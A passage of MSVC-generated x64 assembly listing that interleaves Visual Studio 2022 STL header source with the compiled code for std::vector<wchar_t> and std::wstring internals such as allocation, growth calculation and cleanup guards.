<_Args_0>$ = 16
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 382  : #if _HAS_CXX20
; 383  :     if (_STD is_constant_evaluated()) {
; 384  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 385  :     } else
; 386  : #endif // _HAS_CXX20
; 387  :     {
; 388  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);
; 389  :     }
; 390  : }

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	ret	0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Unfancy_maybe_null@$$CB_W@std@@YAPEB_WPEB_W@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy_maybe_null@$$CB_W@std@@YAPEB_WPEB_W@Z PROC	; std::_Unfancy_maybe_null<wchar_t const >, COMDAT

; 47   :     return _Ptr;

	mov	rax, rcx

; 48   : }

	ret	0
??$_Unfancy_maybe_null@$$CB_W@std@@YAPEB_WPEB_W@Z ENDP	; std::_Unfancy_maybe_null<wchar_t const >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Unfancy_maybe_null@$$CBD@std@@YAPEBDPEBD@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy_maybe_null@$$CBD@std@@YAPEBDPEBD@Z PROC	; std::_Unfancy_maybe_null<char const >, COMDAT

; 47   :     return _Ptr;

	mov	rax, rcx

; 48   : }

	ret	0
??$_Unfancy_maybe_null@$$CBD@std@@YAPEBDPEBD@Z ENDP	; std::_Unfancy_maybe_null<char const >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ PROC ; std::_Tidy_guard<std::vector<wchar_t,std::allocator<wchar_t> > >::~_Tidy_guard<std::vector<wchar_t,std::allocator<wchar_t> > >, COMDAT

; 53   :     _CONSTEXPR20 ~_Tidy_guard() {

$LN37:
	push	rbx
	sub	rsp, 32					; 00000020H

; 54   :         if (_Target) {

	mov	rbx, QWORD PTR [rcx]
	test	rbx, rbx
	je	SHORT $LN6@Tidy_guard
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN6@Tidy_guard

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
	sar	rdx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	add	rdx, rdx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN25@Tidy_guard

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN22@Tidy_guard

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN25@Tidy_guard:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 2054 :             _Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN6@Tidy_guard:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 57   :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN22@Tidy_guard:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN34@Tidy_guard:
??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ ENDP ; std::_Tidy_guard<std::vector<wchar_t,std::allocator<wchar_t> > >::~_Tidy_guard<std::vector<wchar_t,std::allocator<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ PROC ; std::_Tidy_deallocate_guard<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >::~_Tidy_deallocate_guard<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >, COMDAT

; 63   :     _CONSTEXPR20 ~_Tidy_deallocate_guard() {

$LN44:
	push	rbx
	sub	rsp, 32					; 00000020H

; 64   :         if (_Target) {

	mov	rbx, QWORD PTR [rcx]
	test	rbx, rbx
	je	SHORT $LN7@Tidy_deall
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 7

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN17@Tidy_deall
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx]
	lea	rdx, QWORD PTR [rdx*2+2]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN31@Tidy_deall

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN28@Tidy_deall

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN31@Tidy_deall:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN17@Tidy_deall:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	xor	eax, eax

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 7
	mov	QWORD PTR [rbx+16], rax

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR [rbx], ax
$LN7@Tidy_deall:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 67   :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN28@Tidy_deall:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@Tidy_deall:
??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ ENDP ; std::_Tidy_deallocate_guard<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >::~_Tidy_deallocate_guard<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >, COMDAT

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
	mov	QWORD PTR [rcx+16], rax
	mov	rax, rcx
	ret	0
??0?$_Vector_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_Vector_val<std::_Simple_types<wchar_t> >::_Vector_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z
_TEXT	SEGMENT
this$dead$ = 8
__formal$dead$ = 16
__formal$dead$ = 24
?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range, COMDAT

; 2181 :     _CONSTEXPR20 void _Orphan_range(pointer, pointer) const {}

	ret	0
?_Orphan_range@?$vector@_WV?$allocator@_W@std@@@std@@AEBAXPEA_W0@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Orphan_range
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength, COMDAT

; 2141 :     [[noreturn]] static void _Xlength() {

$LN4:
	sub	rsp, 40					; 00000028H

; 2142 :         _Xlength_error("vector too long");

	lea	rcx, OFFSET FLAT:??_C@_0BA@FOIKENOD@vector?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
	int	3
$LN3@Xlength:
?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z
_TEXT	SEGMENT
this$ = 48
_Newvec$ = 56
_Newsize$ = 64
_Newcapacity$ = 72
?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array, COMDAT

; 2017 :     _CONSTEXPR20 void _Change_array(const pointer _Newvec, const size_type _Newsize, const size_type _Newcapacity) {

$LN30:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	mov	QWORD PTR [rsp+32], rsi
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx
	mov	rsi, r9

; 2018 :         // orphan all iterators, discard old array, acquire new array
; 2019 :         auto& _Al         = _Getal();
; 2020 :         auto& _My_data    = _Mypair._Myval2;
; 2021 :         pointer& _Myfirst = _My_data._Myfirst;
; 2022 :         pointer& _Mylast  = _My_data._Mylast;
; 2023 :         pointer& _Myend   = _My_data._Myend;
; 2024 : 
; 2025 :         _My_data._Orphan_all();
; 2026 : 
; 2027 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rcx]
	mov	rbp, r8
	mov	rdi, rdx
	test	rcx, rcx
	je	SHORT $LN6@Change_arr

; 2028 :             _Destroy_range(_Myfirst, _Mylast, _Al);
; 2029 :             _ASAN_VECTOR_REMOVE;
; 2030 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
	sar	rdx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	add	rdx, rdx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN20@Change_arr

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN17@Change_arr

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN20@Change_arr:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN6@Change_arr:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2034 :         _Mylast  = _Newvec + _Newsize;

	lea	rax, QWORD PTR [rdi+rbp*2]
	mov	QWORD PTR [rbx], rdi

; 2037 :     }

	mov	rbp, QWORD PTR [rsp+64]
	mov	QWORD PTR [rbx+8], rax
	lea	rax, QWORD PTR [rdi+rsi*2]
	mov	rsi, QWORD PTR [rsp+72]
	mov	QWORD PTR [rbx+16], rax
	mov	rbx, QWORD PTR [rsp+56]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN17@Change_arr:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN27@Change_arr:
?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
_TEXT	SEGMENT
this$ = 48
_Newcapacity$ = 56
?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Buy_nonzero, COMDAT

; 1999 :     _CONSTEXPR20 void _Buy_nonzero(const size_type _Newcapacity) {

$LN50:
	push	rdi
	sub	rsp, 32					; 00000020H

; 2000 :         // allocate array with _Newcapacity elements
; 2001 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 2002 :         auto& _My_data    = _Mypair._Myval2;
; 2003 :         pointer& _Myfirst = _My_data._Myfirst;
; 2004 :         pointer& _Mylast  = _My_data._Mylast;
; 2005 :         pointer& _Myend   = _My_data._Myend;
; 2006 :         _STL_INTERNAL_CHECK(!_Myfirst && !_Mylast && !_Myend); // check that *this is tidy
; 2007 :         _STL_INTERNAL_CHECK(0 < _Newcapacity);
; 2008 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 2009 : 
; 2010 :         if (_Newcapacity > max_size()) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	mov	rdi, rcx
	cmp	rdx, rax
	ja	SHORT $LN48@Buy_nonzer
	mov	QWORD PTR [rsp+64], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	lea	rbx, QWORD PTR [rdx+rdx]

; 196  :     if (_Bytes == 0) {

	test	rbx, rbx
	jne	SHORT $LN15@Buy_nonzer

; 197  :         return nullptr;

	xor	eax, eax
	jmp	SHORT $LN14@Buy_nonzer
$LN15@Buy_nonzer:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN17@Buy_nonzer

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	SHORT $LN49@Buy_nonzer

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN27@Buy_nonzer

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN14@Buy_nonzer
$LN17@Buy_nonzer:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
$LN14@Buy_nonzer:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR [rdi], rax

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR [rdi+8], rax

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	add	rax, rbx
	mov	rbx, QWORD PTR [rsp+64]
	mov	QWORD PTR [rdi+16], rax

; 2015 :     }

	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN48@Buy_nonzer:

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
	int	3
$LN49@Buy_nonzer:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN27@Buy_nonzer:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN46@Buy_nonzer:
?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Buy_nonzero
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 8
_Newsize$ = 16
?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 1883 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	mov	r8, QWORD PTR [rcx+16]

; 1966 :         // given _Oldcapacity and _Newsize, calculate geometric growth
; 1967 :         const size_type _Oldcapacity = capacity();
; 1968 :         const auto _Max              = max_size();
; 1969 : 
; 1970 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH

; 1883 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	sub	r8, QWORD PTR [rcx]

; 1966 :         // given _Oldcapacity and _Newsize, calculate geometric growth
; 1967 :         const size_type _Oldcapacity = capacity();
; 1968 :         const auto _Max              = max_size();
; 1969 : 
; 1970 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	mov	rcx, rax

; 1883 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	sar	r8, 1

; 1966 :         // given _Oldcapacity and _Newsize, calculate geometric growth
; 1967 :         const size_type _Oldcapacity = capacity();
; 1968 :         const auto _Max              = max_size();
; 1969 : 
; 1970 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	mov	r9, r8
	shr	r9, 1
	sub	rcx, r9
	cmp	r8, rcx
	ja	SHORT $LN1@Calculate_

; 1971 :             return _Max; // geometric growth would overflow
; 1972 :         }
; 1973 : 
; 1974 :         const size_type _Geometric = _Oldcapacity + _Oldcapacity / 2;

	lea	rax, QWORD PTR [r9+r8]

; 1975 : 
; 1976 :         if (_Geometric < _Newsize) {

	cmp	rax, rdx
	cmovb	rax, rdx
$LN1@Calculate_:

; 1977 :             return _Newsize; // geometric growth would be insufficient
; 1978 :         }
; 1979 : 
; 1980 :         return _Geometric; // geometric growth is sufficient
; 1981 :     }

	ret	0
?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$dead$ = 8
?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size, COMDAT

; 1877 :         return (_STD min)(

	mov	rax, 9223372036854775807		; 7fffffffffffffffH

; 1878 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1879 :     }

	ret	0
?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
